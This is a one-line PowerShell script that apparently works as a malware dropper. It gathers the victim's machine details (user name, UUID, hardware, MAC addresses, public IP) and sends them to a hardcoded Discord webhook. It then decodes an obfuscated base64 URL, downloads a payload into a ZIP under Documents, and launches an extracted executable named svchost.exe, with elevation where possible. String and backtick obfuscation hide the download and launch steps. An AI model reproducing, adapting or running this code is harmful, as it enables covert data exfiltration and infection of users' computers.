$pcName     = $env:COMPUTERNAME;$userName   = $env:USERNAME;$uuid       = (Get-WmiObject Win32_ComputerSystemProduct).UUID;$uptime     = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime;$os         = Get-CimInstance Win32_OperatingSystem;$osInfo     = "$($os.Caption) - $($os.Version) ($($os.OSArchitecture))";$cpu        = Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name;$gpu        = Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name;$ramGB      = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2);$mb         = Get-CimInstance Win32_BaseBoard;$mbInfo     = "$($mb.Manufacturer) $($mb.Product)";$drives     = Get-CimInstance Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | ForEach-Object { "$($_.DeviceID): $([math]::Round($_.Size / 1GB, 1)) GB" };$macs       = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress;$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip;$webhookUrl = 'https://discord.com/api/webhooks/1364229648975790151/s6ozqz2IOtEaTUaG7U4D0j6eWKcHqZRodHrMq6QBiCtpvfFxS3nwBeooIgkDj3XX4DPa';$payload = @{username = "PC Info Logger";embeds = @(@{title = "PC System Info - $userName@$pcName";color = 65352;fields = @(@{ name = "IP"; value = "$ip"; inline = $false },@{ name = "UUID"; value = "$uuid"; inline = $true }, @{ name = "Uptime Since"; value = "$uptime"; inline = $false }, @{ name = "OS"; value = "$osInfo"; inline = $false }, @{ name = "CPU"; value = "$cpu"; inline = $false }, @{ name = "GPU"; value = "$gpu"; inline = $false }, @{ name = "RAM"; value = "$ramGB GB"; inline = $true }, @{ name = "Motherboard"; value = "$mbInfo"; inline = $false }, @{ name = "Drives"; value = "$drives"; inline = $false }, @{ name = "MAC Addresses"; value = "$macs"; inline = $false }; ); footer = @{ text = "Made by drkst_shdw" }; timestamp = (Get-Date).ToString("o")})} | ConvertTo-Json -Depth 4;irm -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json';$base64Url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rya3N0LXNoZHcvdGVzdHMvcmVmcy9oZWFkcy9tYWluL2VuY29kZWQudHh0";$url=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64Url));$cmd = [char]105+[char]119+[char]114;$webRequest = & $cmd $url;$base64Content = $webRequest.Content;$decodedBytes = [Convert]::FromBase64String($base64Content);try {Set-ExecutionPolicy RemoteSigned -Scope CurrentUser;}catch{};function Test-IsAdmin {$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);};$zipFilePath = "C:\Users\$env:USERNAME\Documents\download.zip";[System.IO.File]::WriteAllBytes($zipFilePath, $decodedBytes);$extractPath = "C:\Users\$env:USERNAME\Documents\System Utilities";if (Test-Path $extractPath) {Remove-Item -Recurse -Force $extractPath;};Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force;Write-Host "ZIP file extracted to $extractPath";$exePath = Join-Path $extractPath "System Utilities\svchost.exe";if (Test-IsAdmin) {STa`rt-PR`oce`Ss -FilePath $exePath -Verb RunAs;Write-Host "EXE launched as administrator.";} else {& $exePath;Write-Host "EXE launched without elevation.";};
